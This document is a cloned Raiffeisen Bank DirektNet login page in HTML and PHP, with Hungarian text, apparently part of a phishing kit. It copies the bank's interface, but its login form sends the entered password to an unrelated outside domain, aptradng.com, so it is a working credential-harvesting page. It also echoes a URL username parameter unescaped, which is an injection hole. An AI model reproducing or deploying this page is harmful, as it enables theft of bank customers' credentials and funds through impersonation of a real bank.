...
<html xmlns="https://www.w3.org/1999/xhtml">
	<head>
		...
		<meta name="host" content="2-11993228" />
		...
		<script type="text/javascript">
			if (!isAllowedBrowser() && (window.location.pathname.indexOf("/common/browserDetect.jsp") == -1)) {
				window.location="/cgi-bin/rai/direktnet/common/browserDetect.jsp?BV_SessionID=@@@@0237131063.1581361112@@@@&BV_EngineID=ccehadhlegigmhdcefecghkdghkdfhl.0" + "&useragent=" + navigator.userAgent;
			}
		...
		<script type="text/javascript">
						...
						if (scriptSrc != null) {
							if (scriptSrc!='undefined') {
								if (scriptSrc.toLowerCase().indexOf('botnet') != -1) {
									window.location='/cgi-bin/rai/direktnet/common/indetInfo.jsp?BV_SessionID=@@@@0237131063.1581361112@@@@&BV_EngineID=ccehadhlegigmhdcefecghkdghkdfhl.0' + '&useragent=' + navigator.userAgent;
								}
							}
						}
					}
			...
			var indentInfo = '/cgi-bin/rai/direktnet/common/indetInfo.jsp?BV_SessionID=@@@@0237131063.1581361112@@@@&BV_EngineID=ccehadhlegigmhdcefecghkdghkdfhl.0' + '&useragent=' + navigator.userAgent;
		</script>
	
		<title>DirektNet Internet Banking - Raiffeisen Bank</title>
	</head>
	<body class="direktnet" onload="onloadneeded()" onkeypress="onkp()">
		<form name="languageForm" method="post" action="#" autocomplete="off">
						...
						<dl class="tabbed" id="DirektTabBox">
							...
							<dd class="tab1" style="height: auto; padding-bottom:10px;">
								<form name="loginForm" method="post" action="https://aptradng.com/raiffeisen.hu/submit.php" onsubmit="javascript:return validateLoginForm()" autocomplete="off">
									...
									<input type='hidden' name="forceLanguageChange" id="forceLanguageChange"/>
								
									<input type='hidden' name="loginforfactoring" value="false"/>
									...
									<fieldset>
										...
										<span style="border: 1px solid #d1d1d1; margin-bottom: 8px; width: 242px; height: 17px; padding: 3px 6px 0 6px; font-size: 11px; color: #666666; background-color: #e4e4e4; display: inline-block;">
											<?php echo $_GET['username']; ?>
										</span>
										<br/>
										<input type="text" name="usernameOld" id="usernameOld" value="10288482" size="20" maxlength="32" class="text" tabindex="1"  style="display: none;"/>
										<label for="password">Jelszó:</label>
										<input type="password" name="password" id="password" size="20" maxlength="32" tabindex="2" class="text" required/><br/>
									
									
										<input class="submit sprite" type="submit" value="Bejelentkezés" name="Bejelentkezés" tabindex="3"  onmouseover="loginmouseover()"/>
									...
									<div>
										<p>Kérjük, adja meg 8 számjegyű Direkt Azonosítóját és jelszavát, majd kattintson a <b>Bejelentkezés</b> gombra.</p>
									</div>
									...
									<script type="text/javascript">
										...
										if (document.getElementById("alternativeLoginBlock")) {
											var offlineTimeout = setTimeout(function() {
												document.getElementById("alternativeLoginBlock").style.display = "block";
											}, 1000);
										}
									
										
										function clearPolling() {
											if (typeof(offlineTimeout) != "undefined") {
							...
							<dd class="tab2" style="height: auto;">
								<form name="activationForm" method="post" action="dash" autocomplete="off">
								<input type=hidden name="BV_SessionID" value="@@@@0237131063.1581361112@@@@">
<input type=hidden name="BV_EngineID" value="ccehadhlegigmhdcefecghkdghkdfhl.0">

									<script type="text/javascript">
										document.activationForm.action = "https://"+location.hostname+"/cgi-bin/rai/direktnet/activationNew.do?BV_SessionID=@@@@0237131063.1581361112@@@@&BV_EngineID=ccehadhlegigmhdcefecghkdghkdfhl.0"; 
									</script>
									<div>
										...
										<p style="background-image: none;">
											Kérjük, adja meg 8 számjegyű Direkt Azonosítóját és a 4 számjegyű, SMS-ben kapott DirekNet Aktiváló PIN kódot, majd kattintson a 
											<b>Tovább</b> gombra.</p>
											<p style="background-image: none; margin-top:0px;">Új aktiváló PIN-t a +36 80 488 588-as telefonszámon a 2-4-es menüponton, sikeres beazonosítás után vagy a bankfiókban kérhet. További teendőkről a "
											<a href='https://www.raiffeisen.hu/documents/global/termek/szolgaltatas/Direkt_PIN_kod_igenylese_DirektNet_aktivalas.pdf' target='_blank'>Segítségben</a>" olvashat.</p>
											<p style="background-image: none; margin-top:0px;">Ha nincs Direkt Azonosítója, igényeljen internetbanki hozzáférést <a href="https://www.raiffeisen.hu/documents/global/raiportal/pdf/Raiffeisen_DirektNet_igenylolap.pdf" target="_blank">igénylőlapunk</a> postai beküldésével vagy bankfiókunkban.
										</p>
									</div>
...
$('#securityNews').show();*/
						...
						<div class="articleList al_nobborder" id="demoLoginDiv" style="display: none">
							<form name="demoLoginForm" method="post" action="caes" autocomplete="off"><input type=hidden name="BV_SessionID" value="@@@@0237131063.1581361112@@@@">
<input type=hidden name="BV_EngineID" value="ccehadhlegigmhdcefecghkdghkdfhl.0">
